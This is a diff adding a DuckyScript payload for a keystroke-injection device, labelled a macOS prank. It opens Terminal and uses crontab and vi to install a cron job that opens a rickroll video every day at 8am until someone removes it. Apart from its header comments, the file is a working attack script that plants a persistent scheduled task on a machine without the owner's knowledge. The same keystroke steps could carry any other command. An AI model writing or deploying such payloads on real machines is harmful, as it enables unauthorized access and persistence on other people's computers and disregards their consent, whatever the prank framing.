@@ -1,0 +1,35 @@
+REM Title: Mac Chron Job
+
+REM Author: Ecto-1A
+
+REM Description: This will open a terminal window and create a chron job on the mac.  
+REM Chron jobs will repeat daily on the Mac until the chrontab file is edited again to remove the job.
+REM This is currently configured to create a cron job that rickrolls the user at 8am daily. 
+
+REM Target: MacOS
+
+REM Version: 1.0
+
+REM Category: Prank / Automation
+
+DELAY 1000
+GUI SPACE
+DELAY 250
+STRING Terminal
+DELAY 250
+ENTER
+DELAY 500
+STRING crontab -e
+DELAY 250
+ENTER
+STRING i
+DELAY 1000
+STRING 0 8 * * * open https://www.youtube.com/watch?v=dQw4w9WgXcQ
+DELAY 550
+ENTER
+DELAY 500
+ESC
+DELAY 250
+STRING :wq
+DELAY 250
+ENTER
